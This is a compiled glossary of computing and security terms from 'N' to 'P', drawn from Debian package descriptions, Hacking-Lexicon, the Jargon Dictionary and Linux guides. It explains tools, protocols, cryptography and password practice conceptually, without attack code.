>&#13;Linux Radio Transmission Decoder The multimon software can decode a variety of digital transmission modes commonly found on UHF radio. A standard PC soundcard is used to acquire the signal from a transceiver. The decoding is done completely in software. Currently, the following modes are supported:     AX.25         1200 Baud AFSK         2400 Baud AFSK (2 variants)         4800 Baud HAPN         9600 Baud FSK (G3RUH)     POCSAG         512 Baud         1200 Baud         2400 Baud     Miscellaneous         DTMF         ZVEI An arbitrary set of the above modes may run concurrently on the same input signal (provided the CPU power is sufficient), so you do not have to know in advance which mode is used. Note however that some modes might require modifications to the radio (especially the 9600 baud FSK and the POCSAG modes) to work properly. POCSAG (Post Office Code Standards Advisory Group) is a common paging transmission format. From Debian 3.0r0 APT

>&#13;a MusiXTeX extension for handling lyrics musixlyr is a set of TeX macros to be used with Taupin MusiXTeX (version T.52 or later) for typesetting vocal music. Its purpose is to compensate two drawbacks of MusiXTeX's lyrics handling:  * Typesetting lyrics with the "native" musixtex commands \zcharnote,    \zsong etc. tends to be quite inefficient, particularly if the lyrics    have to be changed or corrected.  The idea underlying musixlyr is to    separate lyrics coding from music coding and let TeX weave them    together with as little manual interference as possible.  As a result    you can enter and edit lyrics (nearly) as easily as normal text.  * musixtex has no built-in mechanism for centering hyphens between    syllables and for handling hyphenation at long melismas.  This is    implemented in musixlyr following the example of engraved music.

>&#13;NFS is the UNIX equivalent of SMB. It is a way through which different machines can import and export local files between each other. Like SMB though, NFS sends information including user passwords unencrypted, so it's best to limit its usage to within your local network. The Network File System (NFS) was developed to allow machines to mount a disk partition on a remote machine as if it were on a local hard drive. This allows for fast, seamless sharing of files across a network. It also gives the potential for unwanted people to access your hard drive over the network (and thereby possibly read your email and delete all your files as well as break into your system) if you set it up incorrectly. So please read the Security section of this document carefully if you intend to implement an NFS setup. There are other systems that provide similar functionality to NFS. Samba (http://www.samba.org) provides file services to Windows clients. The Andrew File System from IBM (http://www.transarc.com/Product/EFS/AFS/index.html), recently open-sourced, provides a file sharing mechanism with some additional security and performance features. The Coda File System (http://www.coda.cs.cmu.edu/) is still in development as of this writing but is designed to work well with disconnected clients. Many of the features of the Andrew and Coda file systems are slated for inclusion in the next version of NFS (Version 4) (http://www.nfsv4.org). The advantage of NFS today is that it is mature, standard, well understood, and supported robustly across a variety of platforms. From NFS-HOWTO

>&#13;NetBIOS
</B

><P
>&#13;In Windows, NetBIOS is a way for writing network-aware applications, much like sockets is for UNIX. Misunderstanding: Like sockets, many different protocols can be used to transport applications written to the NetBIOS API. When you say "NetBIOS", some people will understand you to mean the TCP/IP transport. Other people will think of "NetBEUI", which is the transport over raw Ethernet without any intervening routable network protocol. Use the term "NBT" (NetBIOS-over-TCP) or "NetBEUI" to avoid confusion. Contrast: Microsoft's "File and Print Sharing" uses the SMB protocol over NetBIOS. Microsoft supports the NetBIOS interface over TCP/IP, NetBEUI, and Novell's IPX/SPX. Home users who share files among their own machines mistakenly enable File and Print Sharing using the TCP/IP transport, allowing hackers anywhere on the Internet access to their machine. Instead, they should configure it over the NetBEUI transport so that nobody outside their network can access their files (note: this still might open up their networks to people on the same cable-modem VLAN). History: Originally developed by SyTek for IBM. It was implemented in the ROM of IBM'ss broadband Ethernet (3-mbps, over cable TV coax rather than normal Ethernet coax, separate send/receive channels). More: If you maintain a firewall, you will see regular NetBIOS requests in your logs. Read the document http://www.robertgraham.com/pubs/firewall-seen.html#netbios for more info. From Hacking-Lexicon

>&#13;A newsgroup is a notice board that everyone in the world can see. There are tens of thousands of newsgroups and each group is unique in the world. The client software you use to read a newsgroup is called a news reader (or news client). rtin is a popular text mode reader, while netscape is graphical. pan is an excellent graphical news reader that I use. Newsgroups are named like Internet hosts. One you might be interested in is comp.os.linux.announce. The comp is the broadest subject description for computers; os stands for operating systems; and so on. Many other linux newsgroups are devoted to various LINUX issues. Newsgroups servers are big hungry beasts. They form a tree-like structure on the Internet. When you send mail to a newsgroup it takes about a day or so for the mail you sent to propagate to every other server in the world. Likewise, you can see a list of all the messages posted to each newsgroup by anyone anywhere. What's the difference between a newsgroup and a mailing list? The advantage of a newsgroup is that you don't have to download the messages you are not interested in. If you are on a mailing list, you get all the mail sent to the list. With a newsgroup you can look at the message list and retrieve only the messages you are interested in.  Why not just put the mailing list on a web page? If you did, then everyone in the world would have to go over international links to get to the web page. It would load the server in proportion to the number of subscribers. This is exactly what SlashDot is. However, your newsgroup server is local, so you retrieve mail over a faster link and save Internet traffic. From Rute-Users-Guide

ICMP support will be finished shortly.  * Copy, move and delete packets in the trace file.  * Fragment and reassemble IP packets.  * Netdude constantly communicates with a tcpdump process to update    the familiar tcpdump output that corresponds to the trace. This    also means that any changes made to your local version of tcpdump    are reflected in Netdude.  * Plugin architecture: people can easily add plugins for specific    tasks. The code comes with a plugin for checksum correction in IP,    TCP and UDP, and a dummy plugin.  * Through the plugin mechanism, Netdude provides a good facility for    writing tcpdump trace file filters.

>&#13;The Network Mapper nmap is a utility for port scanning large networks, although it works fine for single hosts.  The guiding philosophy for the creation of nmap was TMTOWTDI (There's More Than One Way To Do It).  This is the Perl slogan, but it is equally applicable to scanners.  Sometimes you need speed, other times you may need stealth.  In some cases, bypassing firewalls may be required. Not to mention the fact that you may want to scan different protocols (UDP, TCP, ICMP, etc.).  You just can't do all this with one scanning mode.  And you don't want to have 10 different scanners around, all with different interfaces.  Thus I incorporated virtually every scanning technique I know into nmap.  Specifically, nmap supports:        Vanilla TCP connect() scanning,        TCP SYN (half open) scanning,        TCP FIN (stealth) scanning,        TCP ftp proxy (bounce attack) scanning        SYN/FIN scanning using IP fragments (bypasses packet filters),        UDP recvfrom() scanning,        UDP raw ICMP port unreachable scanning,        ICMP scanning (ping-sweep), and        Reverse-ident scanning. nmap also supports a number of performance and reliability features such as dynamic delay time calculations, packet timeout and retransmission, parallel port scanning, detection of down hosts via parallel pings, and flexible target and port specification.

>&#13;a Relational Database Management System for Unix. NoSQL is a fast, portable, relational database management system without arbitrary limits, (other than memory and processor speed) that runs under, and interacts with, the UNIX Operating System. It uses the Operator/Stream DBMS paradigm described in "Unix Review", March, 1991, page 24, entitled "A 4GL Language".  There are a number of "operators" that each perform a unique function on the data.  The "stream" is supplied by the UNIX Input/Output redirection mechanism.  Therefore each operator processes some data and then passes it along to the next operator via the UNIX pipe function.  This is very efficient as UNIX pipes are implemented in memory.  NoSQL is compliant with the "Relational Model".  *NOTE*: This is a new, re-designed, more performant upstream release which          is no longer command-line compatible with NoSQL V2.          The commands are now in /usr/lib/nosql3 in order to not clutter up          /usr/bin. From Debian 3.0r0 APT

It is not a word processor (it is not clear that word processing is a useful task to share) and it is not a whiteboard - if you want a whiteboard, wb from LBL is a much better whiteboard. Using NTE can be very interactive - unless you lock a block of text, anyone else in your session can edit that text or delete it. This is intentional. Many people can (if they wish) edit the same document simultaneously. Many people can even edit the same block of text simultaneously, but if more than one person tries to edit the same line at one time, a conflict will occur, which results in only one of the changes being preserved.

The ntpd daemon implements NTP, allowing Unix systems to participate in this synchronization. To minimize resource consumption in the general case, this package no longer includes the actual daemon.  You will need either ntp-simple or ntp-refclock, depending on whether you want the drivers for radio clocks included in the refclock version of the daemon. NTP was designed with attention to details which might introduce systematic bias into the computations, and the protocol is capable of synchronizing with even the most precise external time sources.

>&#13;ML language implementation with a class-based object system Objective Caml is an implementation of the ML language, based on the Caml Light dialect extended with a complete class-based object system and a powerful module system in the style of Standard ML. Objective Caml comprises two compilers. One generates bytecode which is then interpreted by a C program. This compiler runs quickly, generates compact code with moderate memory requirements, and is portable to essentially any 32 or 64 bit Unix platform. Performance of generated programs is quite good for a bytecoded implementation: almost twice as fast as Caml Light 0.7. This compiler can be used either as a standalone, batch-oriented compiler that produces standalone programs, or as an interactive, toplevel-based system. The other compiler generates high-performance native code for a number of processors. Compilation takes longer and generates bigger code, but the generated programs deliver excellent performance, while retaining the moderate memory requirements of the bytecode compiler.

This trick has been roundly denounced by those who would return to the good old days when the tactic of dogfighting was dominant, but as Sun Tzu wrote, "What is of supreme importance in war is to attack the enemy's strategy, not his tactics."

>&#13;one-time pad (Vernam Cipher)
</B
></DT
><DD
><P
>&#13;In cryptography, the one-time pad encrypts data by XORing the plaintext against a stream of truely random bits. In theory, the one-time pad is the only unbreakable encryption algorithm, even with infinite resources or quantum computers. This is because if the key (aka. pad) is totally random, then the ciphertext will be random as well. Problem: While the one-time pad is perfectly secure in theory, it has problems in practice, and is rarely used. The major problem is how one distributes the one-time pads to all the receivers. This can be done in some cases, such as sending out CD-ROMs full of random bits with soldiers on the battle-fields, but it becomes unwieldy for normal uses of cryptography. Key point: The pad (secret key) can be used only once. If it is ever used twice, then much of the plaintext can be easily recovered. This means that the pad must be as long as the data being encrypted. History: The one-time pad was invented by G. S. Vernam in 1926, and saw heavy use during WWII. It is still used today in diplomatic corps, spies, the Washington-Moscow "hot-line". Rumor: There are many short-wave radio stations throughout the world broadcasting a human voice reading off long lists of numbers. These are thought to be messages sent to spies throughout the word who decode them with one-time pads. Key point: Today's encryption algorithm are based upon the theoretical underpinnings of the one-time pad. From Hacking-Lexicon

>&#13;A password authentication enhancement, the one-time password allows you to log on only once with a password, after which that password is no longer valid. The way this works is that instead of having a normal password you would memorize, you are given a list of passwords. You use each password sequentially. You might use a hardware device that maintains the list for you. Each time you login, you ask the hardware device for the next password. Key point: The true secret (such as the password used to encrypt the passwords) is never sent across the wire. A hacker could certainly sniff the password from the wire, but it is now useless. Example: The original OTP system was named "S/Key"; a term trademarked by Bellcore. The idea was to create a password authentication system that integrated seamlessly to existing UNIX systems. Other approaches require replacing existing protocols/software with secure password exchanges (like challenge-responses or public-key crypto). However, it should be noted that the S/Key protocol is still vulnerable to man-in-the-middle attacks. From Hacking-Lexicon

It is written in C++ and can be used with Unix systems running the X Window System (Motif look), PC's running Microsoft Windows NT or `95 (native look), or Macintosh systems running MacOS (native look). The Amulet research project in the School of Computer Science at Carnegie Mellon University is creating a comprehensive set of tools which make it significantly easier to create graphical, highly-interactive user interfaces. The lower levels of Amulet are called the `Amulet Toolkit,' and these provide mechanisms that allow programmers to code user interfaces much more easily.  Support is provided for: object selection, save/load, undo, and constraints. As the group at Carnegie Mellon University is no longer funded for its work on Amulet, some Amulet users have founded the OpenAmulet project which has continued its development.

>&#13;"Open-source" describes a set of political values espoused by many on the Internet. When creating software, a programmer will write code. Code is the "source" from which the software is built. This source code is then compiled into object binaries. It is not feasable to reconstruct the source code from the binaries, which means that somebody using software cannot see the source code from which it was built. The political view is that people should be able to view the source, that is should be "open" for reading by anybody. The primary reason is that open-source increases "freedom". People are free to make changes as they like to the source-code, thereby fixing bugs or adding features to their software. There is also a level of paranoia involved: people fear that closed-source they can't read may be doing something subversive, such as secretly monitoring people for the government. Controversey: Open-source advocates believe that it is beneficial for the following reasons: security Security is founded upon the principle of peer review. This is especially true in the world of crypto, where nothing is accepted without years of vetting by members of the crypto community. In the same fashion, many paranoids will trust only peer-reviewed, open-source software. However, as of 2001, both open-source and closed-source have been the source of massive security problems (such as the many popular Linux worms). cost Open-source software licenses are usually free. However, since software licenses for many products are much smaller than operational costs, it price is not as important as other things. For example, BIND and Sendmail are popular not so much for their free licenses, but more for the fact that they have been the standard for more than 15 years. These products are well understood, and therefore cheap for companies to operate. stability and bugs The peer-review model suggests that bugs can be easily found and fixed. However, both open-source and closed-source suffer from the fact that source-code is a constantly moving target. In both cases, new code is being written faster than existing code is being fixed. There are some open-source projects (e.g. OpenBSD) where developers concentrate on stabilizing code rather than moving forward to the latest and greatest features. However, some people think that projects like Linux are too fast a moving target to ever quite stabilize. Since the source-code is open, developers can easily change it to add features. However, few people are developers, and the code is often so poorly documented, adding changes to it can often be more of a burden than starting over from scratch. Example: The following are well known open-source projects: Linux, Apache, sendmail, BIND, Samba, Perl, Mozilla, MySQL From Hacking-Lexicon

><P
>&#13;A type of Interpreted language. P-code languages are something of a hybrid, falling between compiled languages and interpreted languages in the way they execute. Like an interpreted language, P-code programming is converted to a binary form automatically when it is run, rather than having to be compiled. However, unlike a compiled language the executable binary file is stored in pseudo-code, not machine language. In addition, unlike an Interpreted language, the program does not have to be converted to binary each time it is run. After it is converted to P-code the first time, the pseudo-code version is used for each additional execution. P-code languages (and thus their programs) tend to be slower than compiled languages and programs but faster than interpreted languages, and they generally have authorization to some low-level operating system functions but not direct hardware access. They do not require sometimes-expensive compilers, are often included along with operating systems, and some p-code languages are easier to program than compiled languages. Examples of Pcode languages are Java, Python and REXX/Object REXX. From I-gloss

If a user wants to log in to an internal system from an external source, like the Internet, more or alternative information may be required, perhaps a one-time password.

>&#13;PCI supports the useful concept that every vendor and device have unique hex IDs. For instance, Intel has chosen to represent themselves by the completely random number 0x8086 as their vendor ID. PCI cards will provide their IDs on request. You will see numerical values listed in the output of lspci, scanpci, and cat /proc/pci, especially if the respective utility cannot look up the vendor name from the ID number. The file /usr/share/pci.ids ( /usr/share/misc/pci.ids on Debian) from the pciutils package contains a complete table of all IDs and their corresponding names. The kudzu package also has a table /usr/share/kudzu/pcitable containing the information we are really looking for: ID to kernel module mappings. This enables you to use the intended scientific method for locating the correct PCI module from the kernel's /proc/pci data. The file format is easy to understand, and as an exercise you should try writing a shell script to do the lookup automatically. From Rute-Users-Guide

Contrast: PEM and PGP are functionaly similar as far as e-mail encryption is concerned. The main difference is that PEM is based upon PKI standards like X.509 certificates, whereas PGP uses more ad hoc technologies. The frameworks are completely incompatible, so that an e-mail encrypted using one system cannot be decrypted using the other.

</B

><P
>&#13;PKI is the next wave of cryptography. Traditional cryptography (since the time of the ancient Greeks) has been based upon the concept of the "shared secret" (such as a password). This was good, but it suffered from the problem of having to communicate that secret among those people who should know it -- anybody who knew the secret could forge messages to anybody else or decrypt messages intended for other people. In 1970, a new technology called "asymmetric" cryptography was discovered in which a pair of keys could be used: one for encryption-only, and the other for decryption-only. The key used to encrypt could not decrypt, and vice versa. This peculiar mathematical property was discovered to be fantastically useful. For example, you can publish one of the keys to everyone in the world, who can then use it to encrypt a message to you that only you can decrypt. For this reason, the technology is better known as public-key cryptography. The technology works in the other direction as well. This means that you could encrypt a message with your private-key and send it out, and everyone with your public-key will know that it could only have come from you, because only you know your private-key. This authenticates that you are who you say you are. These and other properties provide solutions to a wide number of longstanding issues with cryptography. The various uses for public-keys have been bundled together in what is known as a new cryptographic infrastructure: PKI. Key point: PKI consists of: certificates A public and/or private key is stored in a file called a "certificate". It also includes identification information as to who the own of the certificate is, as well as a signature by a CA validating that the data hasn't been forged. Certificate Authorities (CA) Certificates are issued by a Certificate Authority, who usually will sign the certificate as well as provide some revocation facilities. Certificate Revocation Lists (CRLs) If the private-key is compromised (i.e. inadvertently made public), then the certificate containing that key needs to be "revoked". That essentially means the CA who assigned the certificate posts the certificate on its website. This allows people to publicly check this fact. repositories (e.g. LDAP directories) So that public-keys for people can be found. Uses: PKI (public-keys, certificates, etc.) is used in: S/MIME Secure e-mail. PGP Also secure e-mail. Smart card SSH SSL IPsec From Hacking-Lexicon

A second meaning, Post Office Protocol refers to a way that e-mail client software such as Eudora gets mail from a mail server. When you obtain an account from an Internet Service Provider (ISP) you almost always get a POP account with it, and it is this POP account that you tell your e-mail software to use to get your mail.

A major disadvantage of Pascal is that (its standard version (Standard Pascal) contains many shortcomings.

>&#13;n. An Algol-descended language designed by Niklaus Wirth on the CDC 6600 around 1967-68 as an instructional tool for elementary programming. This language, designed primarily to keep students from shooting themselves in the foot and thus extremely restrictive from a general-purpose-programming point of view, was later promoted as a general-purpose tool and, in fact, became the ancestor of a large family of languages including Modula-2 and Ada (see also bondage-and-discipline language). The hackish point of view on Pascal was probably best summed up by a devastating (and, in its deadpan way, screamingly funny) 1981 paper by Brian Kernighan (of K&#38;R fame) entitled "Why Pascal is Not My Favorite Programming Language", which was turned down by the technical journals but circulated widely via photocopies. It was eventually published in "Comparing and Assessing Programming Languages", edited by Alan Feuer and Narain Gehani (Prentice-Hall, 1984). Part of his discussion is worth repeating here, because its criticisms are still apposite to Pascal itself after ten years of improvement and could also stand as an indictment of many other bondage-and-discipline languages. At the end of a summary of the case against Pascal, Kernighan wrote: 9. There is no escape This last point is perhaps the most important. The language is inadequate but circumscribed, because there is no way to escape its limitations. There are no casts to disable the type-checking when necessary. There is no way to replace the defective run-time environment with a sensible one, unless one controls the compiler that defines the "standard procedures". The language is closed. People who use Pascal for serious programming fall into a fatal trap. Because the language is impotent, it must be extended. But each group extends Pascal in its own direction, to make it look like whatever language they really want. Extensions for separate compilation, FORTRAN-like COMMON, string data types, internal static variables, initialization, octal numbers, bit operators, etc., all add to the utility of the language for one group but destroy its portability to others. I feel that it is a mistake to use Pascal for anything much beyond its original target. In its pure form, Pascal is a toy language, suitable for teaching but not for real programming. Pascal has since been almost entirely displaced (by C) from the niches it had acquired in serious applications and systems programming, but retains some popularity as a hobbyist language in the MS-DOS and Macintosh worlds.

>&#13;All data sent across the Internet is broken up into packets, sent individually across the network, and reassembled back into the original data at the other end. Analogy: Imagine looking at an automobile freeway during rush hour from an airplane. The freeway looks like a flowing river, but each individual car (packet) is really independent from all the others. While it looks like the cars on the freeway are going in the same direction, each car really has its own source and destination separate from the others around it. This is how Internet core routes look. Analogy: Now consider that a bunch of coworkers leave the office and go to a party. Each gets in his/her own car and drives to the party. Each person may take a slightly route, but they all end up together at the party. This demonstrates how data is broken up into individual packets, sent across the Internet (potentially following different routes), then reassembled back again at the destination. Key point: Conceptually, networking occurs at abstract layers well above the concept of packets. Users type in a URL, and the file is downloaded. By dealing with the raw packets themselves, hackers are frequently able to subvert communications in ways not detectable at these higher layers. Contrast: The term "packet switched network (PSN)" is used to describe the Internet, whereas the term "circuit switched network (CSN)" is used to contrast it with the traditional phone system. The key difference is that in the phone system, the route between two people is setup at the start, and each bit in the stream follows that route. On the Internet, each packet finds its own route through the system, so during a conversation, the packets can follow different paths, and indeed arrive out-of-order. Another key difference is latency. The phone system forwards each bit one at a time, so as soon as one arrives, it doesn't have to wait before forwarding it on. On the Internet, bits are bunched together before transmission. Each hop must wait and receive all the bits before forwarding any of them on. Each hop therefore adds a significant amount of delay. Gamers know this as the "ping" time. Key point: There are other technologies that use packets, not just the Internet. Before the Internet came along, X.25 networks were a popular form of packet-based communication (and indeed, X.25 formed the basis for many links on the nascent Internet). From Hacking-Lexicon

>&#13;packet filter
</B
></DT
><DD
><P
>&#13;In firewalls, packet filters are the technology most often used to control traffic. Every packet contains the following fields: source IP address (example: 192.0.2.156) destination IP address transport type (example: TCP=6, UDP=17, ICMP=1) source port (example: HTTP=80, DNS=53, FTP=21) destination port flags (example: SYN) This data is compared against "rules" within the firewall. A typical set of rules might be: BLOCK destination=192.0.2.x TCP flag=SYNALLOW destination=192.0.2.123 TCP destport=80 ALLOW destination=192.0.2.124 TCP destport=25 If our private network is 192.0.2.x, then the first rule above blocks all incoming TCP connections (though outbound connections would still be allowed). The following rules override the first, allowing access to the web-server at port 80 and access to the e-mail server at port 25. Key point: The basic stance of a company firewall is: blocks all UDP traffic except for DNS blocks all incoming TCP connections but allows all outgoing ones allows incoming connections to public HTTP, FTP, SMTP, and DNS servers located in a "DMZ". blocks all ICMP traffic except for those packets needed for path MTU discovery. This allow most access to the Internet for end-users and allows the Internet to access the public servers. It blocks everything else. Contrast: The word "dynamic packet filter" was coined to contrast with the normal "static filter" rules in a firewall described above. Dynamic rules are needed because: Ports are a poor way of identifying protocols (and getting poorer) Whereas most communication uses only outbound connections, some (like FTP) use multiple connections in both directions. In the case of FTP, the client creates an outbound connection to the server, then the server creates separate inbound connections in order to transfer files to the client. Static firewall rules would block this incoming connection, dynamic rules monitor the state and temporarily change the static rules just to allow that connection. An example of a "dynamic" rule is to solve the FTP problem is: Block all incoming connections, but if the user has established a connection to port 21 on a server, then allowing incoming TCP connection from the server port 20 to ports higher than 1024 on the client. Another type of "dynamic" rule is one where the firewall does protocol analysis at layers higher than TCP. To contrast with the example above, the firewall might analyze the FTP connection looking for the PORT command. (The "PORT" command is the FTP protocol whereby the client tells the server which port is has opened to receive a file on). Checkpoint calls this protocol analysis "stateful packet inspection" in their firewall. Other vendors do similar stuff, but call it different names. From Hacking-Lexicon

>&#13;Padding is the process of adding unused data to the end of a message in order to make it conform to a certain length. For example, block-ciphers often work on blocks that are 64-bits (8-bytes) long. Therefore, if you have a message that is 77-bytes long, you will need to "pad" it with an extra 3-bytes to make it an even 80-bytes in size (10-blocks). Key point: Padding is a regular feature of all crypto algorithms, including hashing and encryption. Some algorithms have been broken due to poor choices for padding. Most importantly, however, the size of the message can often reveal details about its contents. For example, let's assume a protocol whereby somebody accepts something with a simple message of "yes", but when it declines, it says "no" along with a reason why it was rejected. Therefore, even though the messages are encrypted, the "yes" will be a short message but the "no" will be a long message. From Hacking-Lexicon

A simple console mode front-end for this API is included in the package, that can load a scene description in one of the supported scene languages and then outputs a single image file in any of the supported graphic formats. Its main features are:   - Plugin architecture. Most elements in the system are     plugin's. This means components are loaded as needed, and can be     substituted, added, etc without recompiling anything. This will     let third parties distribute their plugins outside the main     distribution.   - Object oriented scene description language, with classes,     inheritance, etc. It's easy to use, and has a simple syntax.   - Scene language is a plugin itself, so any other scene language     can be used instead.   - Several rendering methods are possible without any other change     in input scene file. Currently supported methods are raytracing     and zbuffer, but other methods are being tested and will be     incorporated in the future.   - A postprocessing system lets you apply filters to the whole image     after it has been generated by renderer.   - Similarly, there are object filters, that you can apply to an     object in the rendering process. This means a new class of     effects (e.g. a cartoon-like object in a photorealistic scene).   - Materials have a BSDF (Bidirectional Scattering Distribution     Function) that encapsulates its properties with respect to the     light. Now, only Lambertian and Phong BSDF's are implemented, but     more sophisticated ones will follow, like Schlick's, Ward's, etc. From Debian 3.0r0 APT

>&#13;A type of authentication, a pasword is a secret word that a user must know in order to gain access. A passphrse is a correspondingly larger secret consisting of multiple words. History: Passwords have been used since Roman times. The Romans were some of the first large armies where people didn't recognize each other by site. In order to gain entry into the camp, a Roman soldier would have to know the secret password. Key point: The most important defensive mechanism that a corporation can take is to create and enforce policies about proper password usage. This policy should entail: length E.g. minimum of 6 characters composition E.g. upper and lower case, numbers, and punctuation. Note that one of the big support headaches is users who have the caps-lock key on which causes passwords to be mistyped. lifetime E.g. when passwords expire. A good choice would be every 6-months. Password expiration is an overated security technique. It's biggest benefit is that it will automatically age out. source Whether users select their own password or are given one by management. There are automated password programs that will generate easy-to-remember passwords. ownership A policy should declare that passwords should never be shared; many declare that a user will automatically lose privileges if they ever share their password with somebody else. distribution How does the user get his/her password? If the system administrator chooses the password, how do they securely tell the user? If the user chooses a password the first time they log on, how do you prevent other people from getting to the account before the legitimate user? Often people will distribute an initial password, but then force the user to change it. storage Most passwords these days are stored in an encrypted format such that even the administrators cannot know what the password is. authentication period When should the terminal automatically log the user out? Should their be a fixed time, or an inactivity timer? E.g. banking terminals automatically log the user out within a few minutes, PCs have password screen savers that can be configured. Key point: A leading cause of compromise are programs that leave behind default passwords. A leading cause of compromise are users who choose weak passwords that can easily be guessed or cracked. Tools: The crack programs can be used to maintain a strong policy (or break into systems). Tools: On Windows NT, the "passflt.dll" and "passprop.exe" tools can be used to enforce strong passwords. Misunderstanding: People used to believe that a good password was a random mix of UPPER and lower case, numbers, and punctuation. However, this generates passwords that are impossible for users to remember, so they find ways around the restriction, such as writing passwords down on Post-It notes. Therefore, somebody can compromise the network by simply looking for Post-It notes (such as pasted to the bottom of a keyboard). Controversy: Many policies declare that a password must be changed frequently, and most OSes come with tools for enforcing this. However, this leads to the same problem as above: it causes pain for users, so they behave in ways that reduce security. Also, it isn't clear that it dramatically increases security. Contrast: Passwords aren't the only authentication scheme possible. Crypto-cards are often used to generate "one-time passwords" or challenge-response authentication. Tip: Use a Palm Pilot and a crypt program to store your many passwords. Make sure that you choose a encryption program that cannot be broken. Notes: In June, 2001, the British CentralNic commissioned a poll to discover what kinds of passwords people choose. They found that people could be classified: family (50%) Chooses names, such as their own, their partner's (wife, husband, other), children, or pets. They further noted that such people tended to be those who used the computer the least. fan (30%) Chooses names of sports stars, cartoon characters, or pop sars. Since the study was in the United Kingdom, Britsh soccer player David Beckham emerged as the most popular. Variations of Homer Simpson and Madonna also were popular. self-obsessed (11%) Words like "sexy", "stud", "slapper", or "goddess". Note that in the 1995 movie Hackers, the plot centers around a high-level executive who chose "god" for a password, which the hacker easily guessed. cryptics (9%) Passwords with a mix of lower and upper case characters, numbers, and punctuation.

>&#13;A temporary copy of the password. Internal to the computer, password information is constantly being checked. If you were queried for the password each and every time, you would find that computer would become unusable. Therefore, the computer attempts to "cache" the password so that internal prompts during the same session do not cause external prompts to the user. Key point: All systems cache passwords in memory during a login session. Therefore, if a hacker can gain access to all memory on the system, he/she can likely sift the memory for passwords. Likewise, hackers can frequently sift pagefiles for passwords. Key point: Many programs whose goal is ease-of-use will ask the user if they want to save the password on disk (in a file or registry. For example, the MS Outlook e-mail client has this feature to cache the POP3 passwords. Therefore, hackers have programs that will sift the filesystem or registry or these passwords. Some systems will store these cached passwords in clear-text, others attempt to encrypt the passwords, but usually this encryption mechanism ca be defeated. From Hacking-Lexicon

>&#13;1. n. A temporary addition to a piece of code, usually as a quick-and-dirty remedy to an existing bug or misfeature. A patch may or may not work, and may or may not eventually be incorporated permanently into the program. Distinguished from a diff or mod by the fact that a patch is generated by more primitive means than the rest of the program; the classical examples are instructions modified by using the front panel switches, and changes made directly to the binary executable of a program originally written in an HLL. Compare one-line fix. 2. vt. To insert a patch into a piece of code. 3. [in the Unix world] n. A diff (sense 2). 4. A set of modifications to binaries to be applied by a patching program. IBM operating systems often receive updates to the operating system in the form of absolute hexadecimal patches. If you have modified your OS, you have to disassemble these back to the source. The patches might later be corrected by other patches on top of them (patches were said to "grow scar tissue"). The result was often a convoluted patch space and headaches galore. 5. [Unix] the patch(1) program, written by Larry Wall, which automatically applies a patch (sense 3) to a set of source code. There is a classic story of a tiger team penetrating a secure military computer that illustrates the danger inherent in binary patches (or, indeed, any patches that you can't -- or don't -- inspect and examine before installing). They couldn't find any trap doors or any way to penetrate security of IBM's OS, so they made a site visit to an IBM office (remember, these were official military types who were purportedly on official business), swiped some IBM stationery, and created a fake patch. The patch was actually the trapdoor they needed. The patch was distributed at about the right time for an IBM patch, had official stationery and all accompanying documentation, and was dutifully installed. The installation manager very shortly thereafter learned something about proper procedures.  From Jargon Dictionary

You use your patch kit to fix the small holes rather than building yourself a new boat. Key point: The software you are using today likely has security holes that nobody has discovered yet. It seems unlikely, but this has been the historical precidence, whether you are using open-source (e.g. Linux), Microsoft products, or class UNIX systems (e.g. Sun).

Since pdksh is free and compiles and runs on most common unix systems, it is very useful in creating a consistent user interface across multiple machines.  For example, in the CS department of MUN, pdksh is installed on a variety of machines including Suns, HPs, DecStations, PCs running Linux, etc., and is the login shell of ~4500 users.

>&#13;The perl data language. Perl extensions for numerics. PDL (``Perl Data Language'') gives standard perl the ability to COMPACTLY store and SPEEDILY manipulate the large N-dimensional data arrays which are the bread and butter of scientific computing.  The idea is to turn perl in to a free, array-oriented, numerical language in the same sense as commercial packages like IDL and MatLab. One can write simple perl expressions to manipulate entire numerical arrays all at once. For example, using PDL the perl variable $a can hold a 1024x1024 floating point image, it only takes 4Mb of memory to store it and expressions like $a=sqrt($a)+2 would manipulate the whole image in a few seconds. A simple interactive shell (perldl) is provided for command line use together with a module (PDL) for use in perl scripts. Web page: http://pdl.perl.org/ From Debian 3.0r0 APT

>&#13;Progeny graphical installer creation system This package contains PGI, a multi-architecture graphical installer creation system for Debian GNU/Linux originally developed by Progeny Linux Systems, Inc., for their Debian-based "Progeny Debian" operating system. This package enables the user to create ISO images containing a bootable installer (PGI) which guides the user through the steps of installation.  The installer supports text and graphical installation modes.  PGI runs debootstrap to install a minimal Debian system to the target filesystem(s), sets up a boot loader (if the installing user requests), and uses the pivot_root() system call to "boot" into the installed system.  ISO images may be generated with complete or partial Debian package archives, or with the the installer only (useful for network-only installs, which PGI supports.) PGI is extensible and customizable.  Two example extensions are provided with this package; one uses the base-config package, while the other configures the installed system using the X-based Configlet system. Two manuals are provided as part of this package.  "Creating Debian Installers with PGI" documents the setup and configuration of a PGI-based installer ISO in detail.  "Using the PGI Debian Installer" is an example of a PGI user's manual.  Those creating custom installers with PGI will want to update the user's manual for their target audience.

>&#13;The "ping" command is built into both Windows and UNIX machines as a universal way of testing network response time and performance. The name is really based off the similarity to sonar pings, though many people have create a post hoc acronym "Packet INternet Groper". Example: The ping-of-death attack used IP fragmentation to crash systems. It was so named because the ping program built-in to Windows could be easily told to fragment packets this way. Key point: Even though the ping program is simple, it can be abused. Some versions can be commanded to send packets as fast as possible, which is often done to flood networks. Most versions allow the packet size to be set to a large size, forcing fragmentation. When used with the flood above, it can overload machines since fragmentation reassembly is so slow. Contrast: There is an IRC command called "PING" that is unrelated to the ICMP ping. It is simply the text string "PING", where the target replies with "PONG". From Hacking-Lexicon

